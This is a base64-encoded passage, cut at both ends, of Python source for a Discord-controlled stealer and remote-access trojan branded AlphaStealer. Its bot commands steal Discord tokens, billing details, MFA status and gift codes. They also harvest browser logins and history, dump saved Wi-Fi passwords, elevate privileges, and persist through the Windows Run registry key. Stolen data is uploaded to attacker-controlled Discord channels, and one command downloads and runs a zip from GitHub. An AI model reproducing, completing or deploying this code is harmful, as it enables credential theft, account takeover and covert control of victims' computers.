vbS9hdmF0YXJzL3t1c2VyX2lkfS97dXNlclsnYXZhdGFyJ119LnBuZyINCg0KICAgICAgICAgICAgICAgIG5pdHJvID0gWydObycsICdOaXRybyBCb29zdCcsICdOaXRybyBGcmVlJywgJ05pdHJvIEJhc2ljJ11bdXNlclsncHJlbWl1bV90eXBlJ11dIGlmIHVzZXJbJ3ByZW1pdW1fdHlwZSddIGluIFswLCAxLCAyLCAzXSBlbHNlICdObycNCg0KICAgICAgICAgICAgICAgIHBheW1lbnRfbWV0aG9kcyA9ICcsICcuam9pbihbJ0NyZWRpdCBDYXJkJyBpZiBtZXRob2RbJ3R5cGUnXSA9PSAxIGVsc2UgJ1BheVBhbCcgaWYgbWV0aG9kWyd0eXBlJ10gPT0gMiBlbHNlICdObycgZm9yIG1ldGhvZCBpbiBiaWxsaW5nXSkgaWYgYmlsbGluZyBlbHNlICdObycNCg0KICAgICAgICAgICAgICAgIGhxX2d1aWxkcyA9IFtdDQogICAgICAgICAgICAgICAgaWYgZ3VpbGRzOg0KICAgICAgICAgICAgICAgICAgICBmb3IgZ3VpbGQgaW4gZ3VpbGRzOg0KICAgICAgICAgICAgICAgICAgICAgICAgYWRtaW4gPSBpbnQoZ3VpbGRbInBlcm1pc3Npb25zIl0pICYgMHg4ICE9IDANCiAgICAgICAgICAgICAgICAgICAgICAgIGlmIGFkbWluIGFuZCBndWlsZFsnYXBwcm94aW1hdGVfbWVtYmVyX2NvdW50J10gPj0gMTAwOg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIG93bmVyID0gJ+KchScgaWYgZ3VpbGRbJ293bmVyJ10gZWxzZSAn4p2MJw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludml0ZXMgPSBhd2FpdCBzZXNzaW9uLmdldChmImh0dHBzOi8vZGlzY29yZC5jb20vYXBpL3Y4L2d1aWxkcy97Z3VpbGRbJ2lkJ119L2ludml0ZXMiLCBoZWFkZXJzPXsnQXV0aG9yaXphdGlvbic6IHRva2VufSkNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBpbnZpdGVzX2RhdGEgPSBhd2FpdCBpbnZpdGVzLmpzb24oKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGludml0ZSA9IGYiaHR0cHM6Ly9kaXNjb3JkLmdnL3tpbnZpdGVzX2RhdGFbMF1bJ2NvZGUnXX0iIGlmIGludml0ZXNfZGF0YSBlbHNlICJodHRwczovL3lvdXR1LmJlL2RRdzR3OVdnWGNRIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGRhdGEgPSBmIlx1MjAwYlxuKip7Z3VpbGRbJ25hbWUnXX0gKHtndWlsZFsnaWQnXX0pKiogXG4gT3duZXI6IGB7b3duZXJ9YCB8IE1lbWJlcnM6IGAg4pqrIHtndWlsZFsnYXBwcm94aW1hdGVfbWVtYmVyX2NvdW50J119IC8g8J+foiB7Z3VpbGRbJ2FwcHJveGltYXRlX3ByZXNlbmNlX2NvdW50J119IC8g8J+UtCB7Z3VpbGRbJ2FwcHJveGltYXRlX21lbWJlcl9jb3VudCddIC0gZ3VpbGRbJ2FwcHJveGltYXRlX3ByZXNlbmNlX2NvdW50J119IGBcbltKb2luIFNlcnZlcl0oe2ludml0ZX0pIg0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIGxlbignXG4nLmpvaW4oaHFfZ3VpbGRzKSkgKyBsZW4oZGF0YSkgPj0gMTAyNDogYnJlYWsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBocV9ndWlsZHMuYXBwZW5kKGRhdGEpDQogICAgICAgICAgICAgICAgICAgIGhxX2d1aWxkcyA9ICdcbicuam9pbihocV9ndWlsZHMpIGlmIGhxX2d1aWxkcyBlbHNlIE5vbmUNCg0KICAgICAgICAgICAgICAgIGNvZGVzID0gJ1xuXG4nLmpvaW4oW2YiOmdpZnQ6IGB7Y29kZVsncHJvbW90aW9uJ11bJ291dGJvdW5kX3RpdGxlJ119YFxuOnRpY2tldDogYHtjb2RlWydjb2RlJ119YCIgZm9yIGNvZGUgaW4gZ2lmdF9jb2Rlc10pIGlmIGdpZnRfY29kZXMgZWxzZSAnTm8nDQoNCiAgICAgICAgICAgICAgICBpZiBub3QgcmF3X2RhdGE6DQogICAgICAgICAgICAgICAgICAgIGVtYmVkID0gZGlzY29yZC5FbWJlZCh0aXRsZT1mIkRpc2NvcmQgQWNjb3VudCBHcmFiYmVkIiwgY29sb3I9MHhGRjAwMDApDQogICAgICAgICAgICAgICAgICAgIGVtYmVkLnNldF90aHVtYm5haWwodXJsPWF2YXRhcikNCg0KICAgICAgICAgICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iYPCflK5gIMK3IFVTRVIiLCB2YWx1ZT1mJ2BgYHt1c2VybmFtZX1gYGAnKQ0KICAgICAgICAgICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iYPCfhpRgIMK3IFVTRVIgSUQiLCB2YWx1ZT1mJ2BgYHt1c2VyX2lkfWBgYCcpDQogICAgICAgICAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSJg8J+SjWAgwrcgUEhPTkUiLCB2YWx1ZT1mImBgYHtwaG9uZSBpZiBwaG9uZSAhPSBOb25lIGVsc2UgJ05vJ31gYGAiKQ0KICAgICAgICAgICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iYOKcqGAgwrcgRU1BSUwiLCB2YWx1ZT1mImBgYHtlbWFpbCBpZiBlbWFpbCAhPSBOb25lIGVsc2UgJ05vJ31gYGAiKQ0KICAgICAgICAgICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iYPCfk4xgIMK3IE5JVFJPIiwgdmFsdWU9ZiJgYGB7bml0cm99YGBgIiwpDQogICAgICAgICAgICAgICAgICAgIGVtYmVkLmFkZF9maWVsZChuYW1lPSJg8J+TpmAgwrcgTUZBIiwgdmFsdWU9ZiJgYGB7bWZhfWBgYCIsIGlubGluZT1GYWxzZSkNCiAgICAgICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9ImDwn5KZYCDCtyBDT05ORUNUSU9OUyIsIHZhbHVlPWYiYGBgTm90aGluZ2BgYCIsIGlubGluZT1GYWxzZSkNCiAgICAgICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9ImDwn5K4YCDCtyBCSUxMSU5HIiwgdmFsdWU9ZiJgYGB7cGF5bWVudF9tZXRob2RzIGlmIHBheW1lbnRfbWV0aG9kcyAhPSAnJyBlbHNlICdObyd9YGBgIiwgaW5saW5lPUZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iYPCfkqZgIMK3IFRPS0VOIiwgdmFsdWU9ZiJgYGB7dG9rZW59YGBgIiwgaW5saW5lPUZhbHNlKQ0KICAgICAgICAgICAgICAgICAgICBlbWJlZC5zZXRfZm9vdGVyKHRleHQ9J0RldmVsb3BlZCBCeSBBbHBoYVN0ZWFsZXInKQ0KICAgICAgICAgICAgICAgICAgICANCiAgICAgICAgICAgICAgICAgICAgaWYgaHFfZ3VpbGRzOg0KICAgICAgICAgICAgICAgICAgICAgICAgZW1iZWQuYWRkX2ZpZWxkKG5hbWU9ZiJg8J+mtGAgwrcgU2VydmVycyBXaXRoIEFkbWluIC0gKHt1c2VybmFtZX0pIiwgdmFsdWU9aHFfZ3VpbGRzLCBpbmxpbmU9RmFsc2UpDQoNCiAgICAgICAgICAgICAgICAgICAgaWYgY29kZXM6DQogICAgICAgICAgICAgICAgICAgICAgICBlbWJlZC5hZGRfZmllbGQobmFtZT0iKipg8J+RgWAgwrcgUkVRVUVTVFxuKipgT3BlcmF0aW9uOmAgRGlzY29yZCBCYWNrdXAgQ29kZXNcbmBDb2RlczpgIiwgdmFsdWU9Y29kZXMsIGlubGluZT1GYWxzZSkNCg0KICAgICAgICAgICAgICAgICAgICBmaW5hbF90b19yZXR1cm4uYXBwZW5kKGVtYmVkKQ0KICAgICAgICAgICAgICAgIGVsc2U6DQogICAgICAgICAgICAgICAgICAgIGZpbmFsX3RvX3JldHVybi5hcHBlbmQoanNvbi5kdW1wcyh7DQogICAgICAgICAgICAgICAgICAgICAgICAndXNlcm5hbWUnOiB1c2VybmFtZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICd0b2tlbic6IHRva2VuLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ25pdHJvJzogbml0cm8sDQogICAgICAgICAgICAgICAgICAgICAgICAnYmlsbGluZyc6IHBheW1lbnRfbWV0aG9kcyBpZiBwYXltZW50X21ldGhvZHMgZWxzZSAiTm9uZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAnbWZhJzogbWZhLA0KICAgICAgICAgICAgICAgICAgICAgICAgJ2VtYWlsJzogZW1haWwgaWYgZW1haWwgZWxzZSAiTm9uZSIsDQogICAgICAgICAgICAgICAgICAgICAgICAncGhvbmUnOiBwaG9uZSBpZiBwaG9uZSBlbHNlICJOb25lIiwNCiAgICAgICAgICAgICAgICAgICAgICAgICdocV9ndWlsZHMnOiBocV9ndWlsZHMsDQogICAgICAgICAgICAgICAgICAgICAgICAnZ2lmdF9jb2Rlcyc6IGNvZGVzDQogICAgICAgICAgICAgICAgICAgIH0pKQ0KDQogICAgICAgICAgICBmb3IgcmVzdWx0IGluIGZpbmFsX3RvX3JldHVybjoNCiAgICAgICAgICAgICAgICBpZiBpc2luc3RhbmNlKHJlc3VsdCwgZGlzY29yZC5FbWJlZCk6DQogICAgICAgICAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGVtYmVkPXJlc3VsdCkNCiAgICAgICAgICAgICAgICBlbHNlOg0KICAgICAgICAgICAgICAgICAgICBhd2FpdCBjdHguc2VuZChmImBgYHtyZXN1bHR9YGBgIikNCg0KaW50ZW50cyA9IGRpc2NvcmQuSW50ZW50cy5hbGwoKQ0KDQpib3QgPSBjb21tYW5kcy5Cb3QoY29tbWFuZF9wcmVmaXg9Ii4iLCBpbnRlbnRzPWludGVudHMsIGhlbHBfY29tbWFuZD1Ob25lKQ0KDQpob3N0bmFtZSA9IHNvY2tldC5nZXRob3N0bmFtZSgpDQoNCmFwcGRhdGFfcGF0aCA9IG9zLmdldGVudignQVBQREFUQScpDQpmaWxlX3BhdGggPSBvcy5wYXRoLmpvaW4oYXBwZGF0YV9wYXRoLCAnQVNUTFInLCAnYWxwaGFzcXVhZC50eHQnKQ0KDQpkZWYgQ2hlY2tDYXRlZ29yeShmdW5jKToNCiAgICBAd3JhcHMoZnVuYykNCiAgICBhc3luYyBkZWYgd3JhcHBlcihjdHgsICphcmdzLCAqKmt3YXJncyk6DQogICAgICAgIGlmIGN0eC5jaGFubmVsLmNhdGVnb3J5IGlzIE5vbmUgb3IgY3R4LmNoYW5uZWwuY2F0ZWdvcnkubmFtZSAhPSBob3N0bmFtZToNCiAgICAgICAgICAgIGF3YWl0IGN0eC5zZW5kKGYiRWwgUEMgYHtob3N0bmFtZX1gIGVzdMOhIGFwYWdhZG8gbyBubyBkaXNwb25pYmxlLiIpDQogICAgICAgICAgICByZXR1cm4NCiAgICAgICAgcmV0dXJuIGF3YWl0IGZ1bmMoY3R4LCAqYXJncywgKiprd2FyZ3MpDQogICAgcmV0dXJuIHdyYXBwZXINCg0KQGJvdC5ldmVudA0KYXN5bmMgZGVmIG9uX3JlYWR5KCk6DQogICAgZ2FtZSA9IGRpc2NvcmQuR2FtZShmInt1c2VybmFtZX0gfCDwnZWs8J2WkfCdlpXwnZaN8J2WhvCdlb7wnZaZ8J2WhvCdlpHwnZaK8J2WlyIpDQogICAgYXdhaXQgYm90LmNoYW5nZV9wcmVzZW5jZShhY3Rpdml0eT1nYW1lKQ0KICAgIGhvc3RuYW1lID0gc29ja2V0LmdldGhvc3RuYW1lKCkNCiAgICBndWlsZCA9IGJvdC5nZXRfZ3VpbGQoU0VSVkVSKQ0KDQogICAgaWYgZ3VpbGQ6DQogICAgICAgIGNhdGVnb3J5ID0gZGlzY29yZC51dGlscy5nZXQoZ3VpbGQuY2F0ZWdvcmllcywgbmFtZT1ob3N0bmFtZSkNCg0KICAgICAgICBpZiBub3QgY2F0ZWdvcnk6DQogICAgICAgICAgICBjYXRlZ29yeSA9IGF3YWl0IGd1aWxkLmNyZWF0ZV9jYXRlZ29yeShuYW1lPWhvc3RuYW1lKQ0KDQogICAgICAgICAgICBjaGFubmVsX25hbWVzID0gWw0KICAgICAgICAgICAgICAgICJpbmZvIiwNCiAgICAgICAgICAgICAgICAiY29tbWFuZHMiLA0KICAgICAgICAgICAgICAgICJzdGFydHVwIiwNCiAgICAgICAgICAgICAgICAiY29ubmVjdGlvbnMiLA0KICAgICAgICAgICAgICAgICJ3ZWJjYW0iLA0KICAgICAgICAgICAgICAgICJhdWRpbyIsDQogICAgICAgICAgICAgICAgImluamVjdGlvbnMiLA0KICAgICAgICAgICAgICAgICJzY3JlZW5zaG90cyINCiAgICAgICAgICAgIF0NCg0KICAgICAgICAgICAgZm9yIGNoYW5uZWxfbmFtZSBpbiBjaGFubmVsX25hbWVzOg0KICAgICAgICAgICAgICAgIGF3YWl0IGd1aWxkLmNyZWF0ZV90ZXh0X2NoYW5uZWwoY2hhbm5lbF9uYW1lLCBjYXRlZ29yeT1jYXRlZ29yeSkNCg0KICAgICAgICBlbHNlOg0KICAgICAgICAgICAgcGFzcw0KDQogICAgICAgIGNvbm5lY3Rpb25zX2NoYW5uZWwgPSBkaXNjb3JkLnV0aWxzLmdldChjYXRlZ29yeS50ZXh0X2NoYW5uZWxzLCBuYW1lPSJjb25uZWN0aW9ucyIpDQogICAgICAgIGlmIGNvbm5lY3Rpb25zX2NoYW5uZWw6DQogICAgICAgICAgICBhd2FpdCBjb25uZWN0aW9uc19jaGFubmVsLnNlbmQoZiJAZXZlcnlvbmUg8J+SiSB7aG9zdG5hbWV9IChBQ1RJVkUpIikNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3Rva2VucycpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIERpc2NvcmRUb2tlbnMoY3R4KToNCiAgICBndWlsZCA9IGN0eC5ndWlsZA0KICAgIGNhdGVnb3J5ID0gZGlzY29yZC51dGlscy5nZXQoZ3VpbGQuY2F0ZWdvcmllcywgbmFtZT1ob3N0bmFtZSkNCiAgICBpbmZvX2NoYW5uZWwgPSBkaXNjb3JkLnV0aWxzLmdldChjYXRlZ29yeS50ZXh0X2NoYW5uZWxzLCBuYW1lPSJpbmZvIikgaWYgY2F0ZWdvcnkgZWxzZSBOb25lDQoNCiAgICBpZiBpbmZvX2NoYW5uZWw6DQogICAgICAgIGZldGNoZXIgPSBmZXRjaF90b2tlbnMoKQ0KICAgICAgICBhd2FpdCBmZXRjaGVyLnVwbG9hZChpbmZvX2NoYW5uZWwpDQogICAgZWxzZToNCiAgICAgICAgcGFzcw0KDQpAYm90LmNvbW1hbmQobmFtZT0nYW50aWtpbGxwcm9jJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgQW50aUtpbGxQcjBjKGN0eCk6DQogICAgZ2xvYmFsIFByb3RlY3Rvcg0KICAgIFByb3RlY3RvciA9IFRydWUNCiAgICBhd2FpdCBjdHguc2VuZCgn4pyFIFByb3RlY3RvciBNb2RlIEVuYWJsZWQuJykNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2J5cGFzcycpDQpAQ2hlY2tDYXRlZ29yeQ0KYXN5bmMgZGVmIEFTVExSQnlwYXNzKGN0eCk6DQogICAgYXdhaXQgY3R4LnNlbmQoJ0J5cGFzc2luZy4uLicpDQogICAgZWxldmF0ZV90b19hZG1pbigpDQoNCmRlZiBEZWxldGVBU1RMUigpOg0KICAgIG9zLmNoZGlyKGYnQzpcXFVzZXJzXFx7dXNlcm5hbWV9XFxBcHBEYXRhXFxSb2FtaW5nJykNCg0KICAgIGlmIG5vdCBvcy5wYXRoLmV4aXN0cyhGb2xkZXJBU1RMUik6DQogICAgICAgIG9zLm1ha2VkaXJzKEZvbGRlckFTVExSKQ0KICAgIGVsc2U6DQogICAgICAgIHBhc3MNCg0KICAgIERlbEZvbGRlcigpDQoNCmRlZiBSdW5BbHBoYURlc2luZmVjdGVyKCk6DQogICAgb3MuY2hkaXIoZidDOlxcVXNlcnNcXHt1c2VybmFtZX1cXEFwcERhdGFcXFJvYW1pbmdcXEFscGhhRGVzaW5mZWN0ZXJcXEFscGhhRGVzaW5mZWN0ZXInKQ0KICAgIFJ1bkFscGhhRGVzaW5mZWN0ZXJDbWQgPSAnc3RhcnQgQWxwaGFEZXNpbmZlY3Rlci5leGUnDQogICAgc3VicHJvY2Vzcy5Qb3BlbihSdW5BbHBoYURlc2luZmVjdGVyQ21kLCBzaGVsbD1UcnVlKQ0KDQpAYm90LmNvbW1hbmQobmFtZT0nZGVzaW5mZWN0JykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgZGVzaW5mZWN0KGN0eCk6DQogICAgb3MuY2hkaXIoZidDOlxcVXNlcnNcXHt1c2VybmFtZX1cXEFwcERhdGFcXFJvYW1pbmcnKQ0KDQogICAgdXJsID0gJ2h0dHBzOi8vZ2l0aHViLmNvbS9Vbms2OTMvRGVzaW5mZWN0ZXIvcmF3L2NhOTQyMGNkZWUxY2RiZTIyMzY2MzdkNTI5OTgxMWE1Zjk3ZDQwZmUvQWxwaGFEZXNpbmZlY3Rlci56aXAnDQogICAgcmVzcG9uc2UgPSByZXF1ZXN0cy5nZXQodXJsKQ0KDQogICAgd2l0aCBvcGVuKCdBbHBoYURlc2luZmVjdGVyLnppcCcsICd3YicpIGFzIGY6DQogICAgICAgIGYud3JpdGUocmVzcG9uc2UuY29udGVudCkNCg0KICAgIHdpdGggemlwZmlsZS5aaXBGaWxlKCdBbHBoYURlc2luZmVjdGVyLnppcCcsICdyJykgYXMgemlwX3JlZjoNCiAgICAgICAgemlwX3JlZi5leHRyYWN0YWxsKCdBbHBoYURlc2luZmVjdGVyJykNCg0KICAgIHRocmVhZGluZy5UaHJlYWQodGFyZ2V0PVJ1bkFscGhhRGVzaW5mZWN0ZXIsIGRhZW1vbj1UcnVlKS5zdGFydCgpDQogICAgdGltZS5zbGVlcCgwLjEpDQogICAgYXN5bmNpby5ydW5fY29yb3V0aW5lX3RocmVhZHNhZmUoYm90LmNsb3NlKCksIGJvdC5sb29wKQ0KDQpkZWYgY2hlY2tfc3RhcnR1cCgpOg0KICAgIHRyeToNCiAgICAgICAgcmVnaXN0cnlfa2V5ID0gd2lucmVnLk9wZW5LZXkod2lucmVnLkhLRVlfQ1VSUkVOVF9VU0VSLCByIlNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIpDQogICAgICAgIA0KICAgICAgICB0cnk6DQogICAgICAgICAgICB2YWx1ZSwgXyA9IHdpbnJlZy5RdWVyeVZhbHVlRXgocmVnaXN0cnlfa2V5LCAiQVNUTFIiKQ0KICAgICAgICAgICAgd2lucmVnLkNsb3NlS2V5KHJlZ2lzdHJ5X2tleSkNCiAgICAgICAgICAgIHJldHVybiBUcnVlDQogICAgICAgIGV4Y2VwdCBGaWxlTm90Rm91bmRFcnJvcjoNCiAgICAgICAgICAgIHdpbnJlZy5DbG9zZUtleShyZWdpc3RyeV9rZXkpDQogICAgICAgICAgICByZXR1cm4gRmFsc2UNCg0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmV0dXJuIEZhbHNlDQoNCmRlZiBTdGFydFVwT25Ub3AoY3R4KToNCiAgICBnbG9iYWwgU3RydHANCiAgICBleGVfcGF0aCA9IGYnQzpcXFVzZXJzXFx7dXNlcm5hbWV9XFxBcHBEYXRhXFxSb2FtaW5nXFxXaW5kMHdzXFx7UHJvY2Vzcy5uYW1lKCl9Jw0KICAgIEFkZFN0YXJ0dXBDbWQgPSBmJ1JFRyBhZGQgIkhLQ1VcXFNvZnR3YXJlXFxNaWNyb3NvZnRcXFdpbmRvd3NcXEN1cnJlbnRWZXJzaW9uXFxSdW4iIC92IEFTVExSIC90IFJFR19TWiAvZCAie2V4ZV9wYXRofSIgL2YnDQoNCiAgICBwcm9jZXNzID0gc3VicHJvY2Vzcy5Qb3BlbihBZGRTdGFydHVwQ21kLCBzaGVsbD1UcnVlLCBzdGRvdXQ9c3VicHJvY2Vzcy5QSVBFLCBzdGRlcnI9c3VicHJvY2Vzcy5QSVBFKQ0KICAgIHN0ZG91dCwgc3RkZXJyID0gcHJvY2Vzcy5jb21tdW5pY2F0ZSgpDQoNCiAgICBkZWYgc2VuZF9tZXNzYWdlKG1lc3NhZ2UpOg0KICAgICAgICBhc3luY2lvLnJ1bl9jb3JvdXRpbmVfdGhyZWFkc2FmZShjdHguc2VuZChtZXNzYWdlKSwgYm90Lmxvb3ApDQoNCiAgICBpZiBwcm9jZXNzLnJldHVybmNvZGUgPT0gMDoNCiAgICAgICAgaWYgY2hlY2tfc3RhcnR1cCgpOg0KICAgICAgICAgICAgc2VuZF9tZXNzYWdlKCfinIUgTWFsd2FyZSBzYXZlZCB0byBydW4gb24gV2luZG93cyByZWJvb3QuLi4nKQ0KICAgICAgICAgICAgU3RydHAgPSBUcnVlDQogICAgICAgIGVsc2U6DQogICAgICAgICAgICBzZW5kX21lc3NhZ2UoZifinYwgRXJyb3Igc3RhcnR1cCBzeXN0ZW06IFJFRyBhZGQgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAvdiBBU1RMUiAvdCBSRUdfU1ogL2QgIntleGVfcGF0aH0iIC9mIHJldHVybmVkIG5vbi16ZXJvIGV4aXQgc3RhdHVzIDEuJykNCiAgICBlbHNlOg0KICAgICAgICBzZW5kX21lc3NhZ2UoZifinYwgRXJyb3Igc3RhcnR1cCBzeXN0ZW06IFJFRyBhZGQgIkhLQ1VcU29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuIiAvdiBBU1RMUiAvdCBSRUdfU1ogL2QgIntleGVfcGF0aH0iIC9mIHJldHVybmVkIG5vbi16ZXJvIGV4aXQgc3RhdHVzIDEuJykNCg0KQGJvdC5jb21tYW5kKG5hbWU9J3N0YXJ0dXAnKQ0KYXN5bmMgZGVmIHN0YXJ0dXAoY3R4KToNCiAgICBnbG9iYWwgU3RydHANCiAgICB0aHJlYWRpbmcuVGhyZWFkKHRhcmdldD1TdGFydFVwT25Ub3AsIGFyZ3M9KGN0eCwpLCBkYWVtb249VHJ1ZSkuc3RhcnQoKQ0KICAgIA0KICAgIHN0YXJ0dXBfY2hhbm5lbCA9IE5vbmUNCiAgICBmb3IgY2hhbm5lbCBpbiBjdHguY2hhbm5lbC5jYXRlZ29yeS5jaGFubmVsczoNCiAgICAgICAgaWYgY2hhbm5lbC5uYW1lLmxvd2VyKCkgPT0gJ3N0YXJ0dXAnOg0KICAgICAgICAgICAgc3RhcnR1cF9jaGFubmVsID0gY2hhbm5lbA0KICAgICAgICAgICAgYnJlYWsNCg0KICAgIGlmIHN0YXJ0dXBfY2hhbm5lbDoNCiAgICAgICAgaWYgU3RydHA6DQogICAgICAgICAgICBhd2FpdCBzdGFydHVwX2NoYW5uZWwuc2VuZCgn4p2MIEVycm9yIHN0YXJ0dXAgc3lzdGVtOiBSRUcgYWRkICJIS0NVXFNvZnR3YXJlXE1pY3Jvc29mdFxXaW5kb3dzXEN1cnJlbnRWZXJzaW9uXFJ1biIgL3YgQVNUTFIgL3QgUkVHX1NaIC9kICJDOlxcVXNlclxce3VzZXJuYW1lfVxcQXBwRGF0YVxcUm9hbWluZ1xcQm9vc3QtVG9vbFxcQm9vc3QtVG9vbFxcQm9vc3QtVG9vbC5leGUiIC9mIHJldHVybmVkIG5vbi16ZXJvIGV4aXQgc3RhdHVzIDEuJykNCiAgICAgICAgZWxzZToNCiAgICAgICAgICAgIGF3YWl0IHN0YXJ0dXBfY2hhbm5lbC5zZW5kKCfinIUgTWFsd2FyZSBzYXZlZCB0byBydW4gb24gV2luZG93cyByZWJvb3QuLi4nKQ0KICAgIGVsc2U6DQogICAgICAgIGF3YWl0IGN0eC5zZW5kKCLimqDvuI8gTm8gc2UgZW5jb250csOzIGVsIGNhbmFsICdzdGFydHVwJyBlbiBlc3RhIGNhdGVnb3LDrWEuIikNCg0KQGJvdC5jb21tYW5kKG5hbWU9J2Jyb3dzZXJpbmZvJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgQnJvd3NlckluZm8oY3R4KToNCiAgICBlbWJlZCA9IGRpc2NvcmQuRW1iZWQodGl0bGU9J0NvbW1hbmQgU3VjY2VzcycsIGNvbG9yPTB4RkYwMDAwKQ0KICAgIGVtYmVkLnNldF9mb290ZXIodGV4dD0nRGV2ZWxvcGVkIEJ5IEFscGhhU3RlYWxlcicpDQogICAgYXdhaXQgY3R4LnNlbmQoZW1iZWQ9ZW1iZWQpDQogICAgc2F2ZV9hbGxfaGlzdG9yaWVzKCkNCiAgICBzYXZlX2Rvd25sb2Fkc190b190eHQoKQ0KICAgIGdldF9sb2dpbnMoKQ0KDQogICAgb3MuY2hkaXIoZidDOlxcVXNlcnNcXHt1c2VybmFtZX1cXEFwcERhdGEnKQ0KDQogICAgd2l0aCB6aXBmaWxlLlppcEZpbGUoZidCcm93c2VySW5mby17aG9zdG5hbWV9LXt1c2VybmFtZX0tQWxwaGFTcXVhZC56aXAnLCAndycpIGFzIHppcGY6DQogICAgICAgIHppcGYud3JpdGUoJ2xvZ2lucy50eHQnKQ0KICAgICAgICB6aXBmLndyaXRlKCdoaXN0b3J5LnR4dCcpDQogICAgICAgIHppcGYud3JpdGUoJ2Rvd25sb2Fkcy50eHQnKQ0KDQogICAgemlwX2ZpbGVfcGF0aCA9IGYnQnJvd3NlckluZm8te2hvc3RuYW1lfS17dXNlcm5hbWV9LUFscGhhU3F1YWQuemlwJw0KDQogICAgaW5mb19jaGFubmVsID0gTm9uZQ0KICAgIGZvciBjaGFubmVsIGluIGN0eC5jaGFubmVsLmNhdGVnb3J5LmNoYW5uZWxzOg0KICAgICAgICBpZiBjaGFubmVsLm5hbWUgPT0gImluZm8iOg0KICAgICAgICAgICAgaW5mb19jaGFubmVsID0gY2hhbm5lbA0KICAgICAgICAgICAgYnJlYWsNCg0KICAgIGlmIGluZm9fY2hhbm5lbDoNCiAgICAgICAgYXdhaXQgaW5mb19jaGFubmVsLnNlbmQoJ0Jyb3dzZXIgSW5mb3JtYXRpb24gQ29sbGVjdGVkIScsIGZpbGU9ZGlzY29yZC5GaWxlKHppcF9maWxlX3BhdGgpKQ0KDQogICAgb3MucmVtb3ZlKCdsb2dpbnMudHh0JykNCiAgICBvcy5yZW1vdmUoJ2hpc3RvcnkudHh0JykNCiAgICBvcy5yZW1vdmUoJ2Rvd25sb2Fkcy50eHQnKQ0KICAgIG9zLnJlbW92ZShmJ0Jyb3dzZXJJbmZvLXtob3N0bmFtZX0te3VzZXJuYW1lfS1BbHBoYVNxdWFkLnppcCcpDQoNCmRlZiBvYnRlbmVyX2lwX3B1YmxpY2EoKToNCiAgICB0cnk6DQogICAgICAgIGlwID0gcmVxdWVzdHMuZ2V0KCdodHRwczovL2FwaS5pcGlmeS5vcmcnKS50ZXh0DQogICAgICAgIHJldHVybiBpcA0KICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToNCiAgICAgICAgcmV0dXJuIGYiRXJyb3IgYWwgb2J0ZW5lciBJUDoge2V9Ig0KDQppcCA9IG9idGVuZXJfaXBfcHVibGljYSgpDQoNCkBib3QuY29tbWFuZChuYW1lPSd3aWZpJykNCkBDaGVja0NhdGVnb3J5DQphc3luYyBkZWYgd2lmaShjdHgpOg0KICAgIHRyeToNCiAgICAgICAgcHJvZmlsZXNfb3V0cHV0ID0gc3VicHJvY2Vzcy5jaGVja19vdXRwdXQoDQogICAgICAgICAgICBbJ25ldHNoJywgJ3dsYW4nLCAnc2hvdycsICdwcm9maWxlcyddLA0KICAgICAgICAgICAgdGV4dD1UcnVlLA0KICAgICAgICAgICAgZW5jb2Rpbmc9J2NwODUwJw0KICAgICAgICApDQoNCiAgICAgICAgcHJvZmlsZXMgPSByZS5maW5kYWxsKHIiUGVyZmlsIGRlIHRvZG9zIGxvcyB1c3Vhcmlvc1xzKjpccyguKikiLCBwcm9maWxlc19vdXRwdXQpDQogICAgICAgIA0KICAgICAgICBpZiBub3QgcHJvZmlsZXM6DQogICAgICAgICAgICBhd2FpdCBjdHguc2VuZCgi4p2MIE5vIHNlIGVuY29udHJhcm9uIHJlZGVzIFdpRmkgZ3VhcmRhZGFzLiIpDQogICAgICAgICAgICByZXR1cm4NCg0KICAgICAgICBzc2lkID0gcHJvZmlsZXNbMF0uc3RyaXAoKQ0KDQogICAgICAgIHdpZmlfZGV0YWlsc19vdXRwdXQgPSBzdWJwcm9jZXNzLmNoZWNrX291dHB1dCgNCiAgICAgICAgICAgIFsnbmV0c2gnLCAnd2xhbicsICdzaG93JywgJ3Byb2ZpbGUnLCBmJ25hbWU9e3NzaWR9JywgJ2tleT1jbGVhciddLA0KICAgICAgICAgICAgdGV4dD1UcnVlLA0KICAgICAgICAgICAgZW5jb2Rpbmc9J2NwODUwJw0KICAgICAgICApDQoNCiAgICAgICAgcGFzc3dvcmRfbWF0Y2ggPSByZS5zZWFyY2gociJDb250ZW5pZG8gZGUgbGEgY2xhdmVccyo6XHMoLiopIiwgd2lmaV9kZXRhaWxzX291dHB1dCkNCg0KICAgICAgICBpZiBwYXNzd29yZF9tYXRjaDoNCiAgICAgICAgICAgI